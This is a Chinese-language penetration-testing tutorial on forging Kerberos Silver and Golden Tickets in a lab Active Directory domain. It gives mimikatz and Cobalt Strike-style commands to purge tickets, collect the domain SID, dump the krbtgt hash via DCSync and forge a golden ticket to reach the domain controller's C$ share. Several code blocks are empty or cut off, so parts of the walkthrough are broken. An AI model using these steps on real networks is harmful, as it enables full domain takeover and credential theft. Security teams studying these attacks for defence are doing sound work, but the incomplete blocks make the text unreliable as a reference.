# 1、白银票据

## 1.1 简介

白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。如下图所示，与域控制器没有AS-REQ 和 AS-REP（步骤1和2），也没有TGS-REQ / TGS-REP（步骤3和4）通信。由于银票是伪造的TGS，所以没有与域控制器通信。

![](../Images/807af596a3afa03306ab22bc5ab4617f.png)

## 1.2 利用条件

### 1.基本条件

```


1.域名称
```

### 2.白银票据服务列表

| Service Type || Service Silver Tickets |
| --- | --- |
| WMI || HOST RPCSS |
| PowerShell Remoting || HOST HTTP |
| WinRM || HOST HTTP |
| Scheduled Tasks || HOST |
| Windows File Share (CIFS) || CIFS |
| LDAP operations includingMimikatz DCSync || LDAP |
| Windows Remote Server Administration Tools || RPCSS LDAP CIFS |

### 2.伪造白银票据-CIFS共享

#### 1.清除本地票据

白银票据利用条件已全部满足。开始实施伪造TGS前，为避免干扰，先将Client(Windows Server 2008、域成员)上的本地票据清除。

**使用mimikatz清除**

```

mimikatz kerberos::purge
```

![](../Images/018713b41783f604c82e7efaf00bbad0.png)

**或者使用系统命令清除**

```

klist purge
```

![](../Images/7730b5591294331724b0c9b150dcaa71.png)

#### 2.尝试访问AD服务

未创建票据前访问不成功

```
shell dir \\\\DC.seclabs.com\\c$
```

![](../Images/0e53d1a7622607523a742a87b364eb73.png)

#### 3.创建访问AD的CIFS服务票据

```


/domain：# 当前域名称
```

```

```

![](../Images/e19aff5ae97d37b98ec01eda087ae970.png)

#### 4.访问DC的CIFS服务

```
shell dir \\\\DC.seclabs.com\\c$
```

![](../Images/01c0036f67fcf8d8d34a52051b4126bb.png)

# 2、黄金票据

## 2.1 简介

Golden Ticket（金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。

每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。

如下图所示，与域控制器没有AS-REQ或AS-REP（步骤1和2）通信。由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到域控制器以获得服务票据。

![](../Images/eb1c99d046d13cb83d4e96ed43946c57.png)

## 2.2 利用条件

```


1、域名称            
```

## 2.3 利用方法

### 1.获取基本信息

#### 1.域名称获取

```
shell net time /domain
```

![](../Images/17638cbd4e94a627a178fae02ed676c4.png)

#### 2.域SID值获取

```
shell whoami /user
```

![](../Images/7ed2b844a485b7630def544ffea0139c.png)

域SID:`S-1-5-21-3864002930-708215365-3478260457`,需要去除最后-后面内容

#### 3.KRBTGT账户HASH

```
mimikatz lsadump::dcsync /domain:seclabs.com /user:krbtgt
```

![](../Images/d5d3961410be7ad57dde6c905be6cb68.png)

KRBTGT账号HASH:`6434d17dfe0a2500d75df35358668da1`

### 2.创建黄金票据

#### 1.创建黄金票据

```
mimikatz kerberos::golden /admin:administrator /domain:seclabs.com /sid:S-1-5-21-3864002930-708215365-3478260457 /krbtgt:6434d17dfe0a2500d75df35358668da1 /ticket:golden.kiribi
```

![](../Images/1dbc58fc99008de0140d62adbc0d126e.png)

#### 2.导入伪造Golden Ticket

通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中

```


mimikatz kerberos::purge                 # 清除所有票据
```

![](../Images/41156edfb880d2068744e2fef631e1be.png)

#### 3.访问AD域控目录

```
shell dir \\\\DC.seclabs.com\\c$
```

![](../Images/03c8c96006681cb47b777f2447e0f7d9.png)
